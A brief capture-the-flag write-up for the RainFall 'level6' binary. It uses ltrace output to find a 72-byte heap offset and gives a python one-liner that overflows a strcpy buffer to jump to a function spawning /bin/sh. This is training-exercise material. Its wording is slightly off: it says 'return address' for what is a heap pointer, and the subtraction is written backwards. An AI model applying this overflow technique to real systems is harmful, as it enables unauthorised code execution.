here strcpy is vulnerable, because it copies as much data as it can from the src, without any consideration of it's size. like already done in previous exercises, we will overflow the buffer, and overwrite the return address of the function, to make it point to the address of the function `n` which call `/bin/sh`.
to get the actual size of the buffer to overflow :
`ltrace ./level6`

```bash
level6@RainFall:~$ ltrace ./level6
__libc_start_main(0x804847c, 1, 0xbffff804, 0x80484e0, 0x8048550 <unfinished ...>
malloc(64)                                                                                       = 0x0804a008
malloc(4)                                                                                        = 0x0804a050
```

`0x0804a008 - 0x0804a050 = 72` so we have to fill 72 char to overflow the buffer, then the address of `n`.
we can get the address of `n` through any decompiler or gdb with `info function n` : `08048454`
`./level6 $(python -c 'print "i" * 72 + "\x54\x84\x04\x08"')`
